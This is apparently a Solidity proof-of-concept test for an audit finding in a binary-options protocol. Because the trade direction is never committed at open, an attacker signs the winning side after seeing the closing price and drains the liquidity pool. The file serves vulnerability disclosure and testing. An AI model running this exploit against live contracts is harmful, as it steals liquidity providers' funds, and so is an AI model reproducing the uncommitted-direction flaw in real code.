// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "./BufferHarness.sol";

/// AuditVault #55635 [H-03] — the market DIRECTION of a trade is never committed
/// on-chain at open; it is only revealed at close via a signature from the
/// trader's own 1CT key (`optionInfo.signer`). With private keeper mode disabled,
/// the trader closes the option themselves and simply signs whichever direction
/// is winning after observing the closing price — guaranteeing a payout on every
/// trade and draining LP funds.
contract PoC_55635 is BufferBase {
    address internal constant ATTACKER = address(0xA11CE);
    address internal constant HONEST = address(0xBEEF);

    uint256 internal constant STRIKE = 1_000e8;
    uint256 internal constant AMOUNT = 100e6;
    uint256 internal constant FEE = 60e6;

    function test_H03_chooseWinningDirectionAtClose() public {
        _deployStack();

        uint256 queuedTime = 1_000;
        uint256 period = 3_600; // expiration = 4600
        vm.warp(50_000);

        // The closing price ends BELOW strike (900 < 1000). A call (isAbove=true)
        // is a LOSER here; a put (isAbove=false) is a WINNER. Nothing on-chain
        // committed the trader to a direction at open.
        uint256 closingTime = 5_000;   // >= expiration => full payout on exercise
        uint256 closingPrice = 900e8;  // below strike

        // --- NEGATIVE CONTROL: an honest trader committed to a call (isAbove=true) ---
        // Below strike => not in-the-money => option expires worthless.
        uint256 ctrlId = _seed(HONEST, 2, STRIKE, AMOUNT, FEE, queuedTime, period);
        IBufferRouter.CloseAnytimeParams memory honest =
            _closeParams(ctrlId, closingPrice, true /*call*/, closingTime, closingTime, closingTime);
        _attestUser(honest, 2);
        _attestPublisher(honest);
        uint256 honestBefore = usdc.balanceOf(HONEST);
        _close(honest);
        assertEq(usdc.balanceOf(HONEST) - honestBefore, 0, "committed-call trader loses when price < strike");
        assertEq(uint256(_optionState(ctrlId)), uint256(IBufferBinaryOptions.State.Expired), "control expired worthless");

        // --- EXPLOIT: attacker sees price < strike and signs a PUT (isAbove=false) ---
        // `!isAbove && closingPrice < strike` => in-the-money => full payout.
        uint256 attId = _seed(ATTACKER, 1, STRIKE, AMOUNT, FEE, queuedTime, period);
        IBufferRouter.CloseAnytimeParams memory exploit =
            _closeParams(attId, closingPrice, false /*put chosen post-hoc*/, closingTime, closingTime, closingTime);
        _attestUser(exploit, 1);
        _attestPublisher(exploit);

        uint256 poolBefore = usdc.balanceOf(address(pool));
        uint256 attBefore = usdc.balanceOf(ATTACKER);
        _close(exploit);
        uint256 payout = usdc.balanceOf(ATTACKER) - attBefore;

        // === HARM: identical option + identical price, but the attacker wins the
        // FULL locked amount purely by choosing the direction after the fact ===
        assertEq(uint256(_optionState(attId)), uint256(IBufferBinaryOptions.State.Exercised), "attacker option exercised");
        assertEq(payout, AMOUNT, "attacker drained the FULL locked amount by picking the winning side");
        assertEq(poolBefore - usdc.balanceOf(address(pool)), AMOUNT, "LP pool paid the attacker");
        emit log_named_uint("attacker payout choosing winning side (USDC 1e6)", payout);
        emit log_named_uint("honest committed-side payout (USDC 1e6)", 0);
    }
}
